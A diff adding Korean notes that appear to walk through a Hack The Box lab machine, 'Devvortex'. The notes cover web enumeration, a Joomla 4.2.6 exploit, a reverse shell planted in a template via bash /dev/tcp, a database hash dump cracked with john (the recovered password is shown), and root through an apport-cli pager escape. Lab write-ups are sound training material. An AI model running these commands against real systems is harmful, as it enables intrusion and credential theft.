@@ -1,1 +1,42 @@
-# ㅇㅁㄴ
+nmap 결과 22번과 80번 포트가 열려있는 것을 확인
+웹 디렉터리 구조 확인을 위해 gobuster dir -u http://10.10.11.242 -w /usr/share/dirb/wordlists/small.txt로 확인
+
+별다른 정보가 나오지 않아 gobuster dns -d devvortex.htb -w /usr/share/wordlists/dnsmap.txt로 스캔(검색된 도메인의 ip까지 검색)
+dev.devvortex.htb 서브 도메인을 검색할 수 있었고 /etc/hosts에 resolve 해준다.
+예시 10.10.11.242  devvortex.htb dev.devvortex.htb
+
+wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://dev.devvortex.htb/FUZZ -t 200 --hc 404,403
+->해당 예시는 검색한 것으로 여러 검색 툴로 히든 파일등을 스캔
+
+dev.devvortex.htb/administrator 경로와 경로에서 joomla 발견
+
+joomla:오픈소스 저작물 관리 시스템
+
+joomscan --url http://dev.devvortex.htb로 스캔
+joomla 버전이 4.2.6인 것을 확인->취약한 버전으로 exploit code를 사용
+
+exploit-db에서 joomla 4.2.6의 파이썬 exploit code 실행
+ruby 51334.py http://dev.devvortex.htb
+찾은 관리자의 크리덴셜로 관리자 페이지 로그인
+
+joomla를 이용하여 템플릿 소스코드를 수정하여 reverse shell획득을 시도
+nc -lnvp 4444
+소스코드에 system('bash -c "bash -i >& /dev/tcp/10.10.11.73/4444 0>&1"'); 삽입
+
+cat /etc/passwd를 수행하여 logan이라는 사용자를 발견, 해당 계정을 통해 ssh 로그인 시도
+그 전에 얻은 관리자 크리덴셜로 db에 연결하여 비밀번호를 알아내야 함
+
+(reverse shell에서 실행)
+python3 -c "import pty;pty.spawn('/bin/bash')"
+mysql -u lewis -p joomla --password=pw입력
+
+연결 후 show tables, select * from sd4fg_users등으로 정보 검색
+비밀번호를 해쉬값으로 얻을 수 있음
+pw.txt에 해쉬 값 저장
+
+john --wordlist=/usr/share/wordlists/rockyou.txt pw.txt 로 해쉬 값 크랙
+ssh logan@10.10.11.242 이후 pw 입력(tequieromucho)
+sudo /usr/bin/apport-cli -f
+
+리포트를 하는 프로그램 사용 중 마지막 단계에 view report에서 !/bin/bash를 붙여넣기 할 경우 루트 권한을 획득하는 취약점을 이용
+권한 획득 후 /root/root.txt의 flag값 읽
